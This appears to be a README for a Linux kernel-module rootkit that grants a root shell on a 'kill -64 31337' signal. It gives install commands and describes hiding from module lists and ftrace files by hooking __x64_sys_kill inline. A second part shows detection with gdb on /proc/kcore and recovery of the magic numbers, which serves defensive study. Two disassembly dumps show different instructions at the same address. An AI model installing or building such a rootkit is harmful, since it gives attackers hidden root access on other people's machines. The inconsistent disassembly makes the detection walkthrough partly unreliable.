#### A simple LKM which gives a rootshell. Also hides module from /sys/module and /proc/modules as well as kernel tracing files.<br>

```
# git clone https://github.com/carls0n/modrootshell
# cd modrootshell
# make
# sudo insmod modrootshell
# kill -64 31337 [user defined number in source code] gives a rootshell
```

Must have module unhidden to uninstall
```
# kill -63 8000 (or whatever number you defined in source code)
# sudo rmmod modrootshell
```
---
In my paper, 'defeating LKM and LD_PRELOAD rootkits for fun and profit' [https://carls0n.github.io], I talked about the impossibility of using ftrace or even kprobes for your LKM and not registering under /sys/kernel/tracing/enabled_functions. Even if we used kprobes and notrace in our code, we could make the registrations under available_filter_functions vanish, but hooking sys_kill via kprobes still uses the ftrace backend, which is going to register SOMETHING in enabled_functions.<br>

Well...there's more than one way to skin a cat, as they say. There are more options available for hooking sys_kill. Here, in order to hook sys_kill, this module registers a temporary kprobe to locate the non-exported kallsyms_lookup_name function. Once we extract its address, the kprobe is immediately unregistered. We then use kallsyms_lookup_name to resolve the memory address of __x64_sys_kill and deploy our inline hook. This method allows us to bypass the ftrace based enabled_functions file. Nothing registered there. Then, we use notrace in our code for our functions, which will successfully hide them from available_filter_functions.<br>

Of course, the module starts out hidden. From both /sys/module and /proc/modules. You might already be wondering, if we cant detect this module via /sys/kernel/tracing/enabled_functions or /sys/kernel/tracing/available_filter_functions, then how do we find it? Short of running volatility and looking for it in memory.<br>

Actually, it's quite simple if you just know this one thing. Here we are going to get the address of __x64_sys_kill:
```
# sudo grep -w "__x64_sys_kill" /proc/kallsyms
ffffffff8fd87790 T __x64_sys_kill
```
Copy the address above, just the first series of letters and nummbers

Next, type the following:<br>
```
# sudo gdb --core=/proc/kcore<br>

[New LWP 1]
Core was generated by 'BOOT_IMAGE=/vmlinuz-linux root=UUID=bc34e1d3-da3c-41c1-8555-d0bb0557ba74 rw zsw'.
(gdb)
```
At the prompt, type the following, which should give us the first 5 instructions starting at this address. Using the address we got from kallsyms for __x64_sys_kill. Just put an 0x in front of it. That tells gdb that the address is going to be in hexadecimal format.<br>
```
(gdb) x/5i 0xffffffff8fd87790
   0xffffffff8fd87790:	movabs $0xffffffffc07c7200,%rax
   0xffffffff8fd8779a:	jmp    *%rax
   0xffffffff8fd8779c:	mov    $0x1,%esi
   0xffffffff8fd877a1:	push   %rbx
   0xffffffff8fd877a2:	sub    $0x38,%rsp
(gdb)
```
If the above is what you have, you found it! Pay particular attention to the first two instructions. This absolutely proves that sys_kill is hooked!<br>

If you dont have have kcore<br>
```
# ls -l /proc/kcore
```
then your kernel was compiled without support for it. Support would require recompiling the kernel but is out of the scope of this text.

#### Is it possible since we know the signal to unhide the module is 63, to find the magic number? Yes it is!<br>

Let's look at the orginal first 5 instructions for gdb
```
(gdb) x/5i 0xffffffffad922da0
   0xffffffffad922da0:	movabs $0xffffffffc29c0200,%rax
   0xffffffffad922daa:	jmp    *%rax
   0xffffffffad922dac:	add    %eax,(%rax)
   0xffffffffad922dae:	add    %al,(%rax)
   0xffffffffad922db0:	mov    %rsp,%rbp
```
   Now, let's look at the address in movabs
  ``` 
(gdb) x/15i 0x 0xffffffffc29c0200
```
this will show us the next 15 instructions.<br>
```
   0xffffffffc29c0200:	push   %rbp
   0xffffffffc29c0201:	mov    %rsp,%rbp
   0xffffffffc29c0204:	push   %rbx
   0xffffffffc29c0205:	mov    %rdi,%rbx
   0xffffffffc29c0208:	sub    $0x18,%rsp
   0xffffffffc29c020c:	mov    0x70(%rdi),%rdx
   0xffffffffc29c0210:	mov    %gs:0x28,%rax
   0xffffffffc29c0219:	mov    %rax,-0x10(%rbp)
   0xffffffffc29c021d:	xor    %eax,%eax
   0xffffffffc29c021f:	mov    0x68(%rdi),%rax
   0xffffffffc29c0223:	cmp    $0x40,%eax
   0xffffffffc29c0226:	jne    0xffffffffc29c0235
   0xffffffffc29c0228:	cmp    $0x7a69,%rdx
   0xffffffffc29c022f:	je     0xffffffffc29c02bc
   0xffffffffc29c0235:	cmp    $0x3f,%eax
```
Look at the cmp instuctions. the first one means 64 in decimal. Theres our kill -64 signal. The next cmp instruction means 31337.
There is our kill -64 signal and its magic number for getting root. Almost there. Lets look at the last cmp instruction. It means 63 in decimal.
There is our kill signal to unhide the module that we need so that we can remove it! But whats the magic number?
Let's look at the next 20 instructions.
```
(gdb) x/20i 0xffffffffc29c0200
   0xffffffffc29c0200:	push   %rbp
   0xffffffffc29c0201:	mov    %rsp,%rbp
   0xffffffffc29c0204:	push   %rbx
   0xffffffffc29c0205:	mov    %rdi,%rbx
   0xffffffffc29c0208:	sub    $0x18,%rsp
   0xffffffffc29c020c:	mov    0x70(%rdi),%rdx
   0xffffffffc29c0210:	mov    %gs:0x28,%rax
   0xffffffffc29c0219:	mov    %rax,-0x10(%rbp)
   0xffffffffc29c021d:	xor    %eax,%eax
   0xffffffffc29c021f:	mov    0x68(%rdi),%rax
   0xffffffffc29c0223:	cmp    $0x40,%eax
   0xffffffffc29c0226:	jne    0xffffffffc29c0235
   0xffffffffc29c0228:	cmp    $0x7a69,%rdx
   0xffffffffc29c022f:	je     0xffffffffc29c02bc
   0xffffffffc29c0235:	cmp    $0x7a69,%rdx
   0xffffffffc29c0238:	jne    0xffffffffc29c02f2
   0xffffffffc29c023e:	cmp    $0x1a0a,%rdx
   0xffffffffc29c0245:	jne    0xffffffffc29c02f2
   0xffffffffc29c024b:	cmpw   $0x0,0x2309(%rip)        # 0xffffffffc29c255c
   0xffffffffc29c0253:	je     0xffffffffc29c0360
```
Finally, looking at the last cmp in this set of instructions means 6666 in decimal. That's it! kill -63 6666 will reveal the module. Then it can be safely removed.  Don't think I know these things in my head. I used google. Let google help you decode these instructions.
